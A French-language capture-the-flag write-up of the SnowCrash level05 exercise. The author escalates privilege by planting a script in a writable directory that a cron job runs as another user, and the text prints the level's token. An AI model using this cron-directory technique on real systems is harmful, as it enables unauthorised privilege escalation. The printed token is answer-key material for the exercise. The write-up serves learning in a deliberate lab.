Ici nous n'avons aucun script / binaire

On regarde le `/etc/passwd` et l'env et on trouve rien d'interessant.

On fait un coup de `find` comme le level00

```bash
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```bash
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver

#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

Nous n'avons pas la permission de cat `/rofs/usr/sbin/openarenaserver`

Nous allons essayer de mettre un script dans `/opt/openarenaserver` car nous avons les droits d'ecriture dans ce dossier.

Ca fonctionne mais nous ne voyons pas la sortie des scripts

Nous allons donc essayer de getflag > file.flag

Nous n'avons pas les droits d'ecriture dans le home, nous devons faire la redirection ailleurs

Dans /opt/openarenaserver on peut ecrire mais le fichier sera de suite delete a cause de la crontab

On essaye

alias rm=echo

Ca ne fonctionne pas

on essage de mettre un script.sh
```bash
getflag > /tmp/toto.flag
```
Ca ne fonctionne pas

Apres 30 minutes a tourner en rond, on se rend compte que nos script n'ont pas les droits d'executions...

chmod +x script.sh

```bash
level05@SnowCrash:/opt/openarenaserver$ cat /tmp/flag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
On attend le passage de la crontab et bingo !
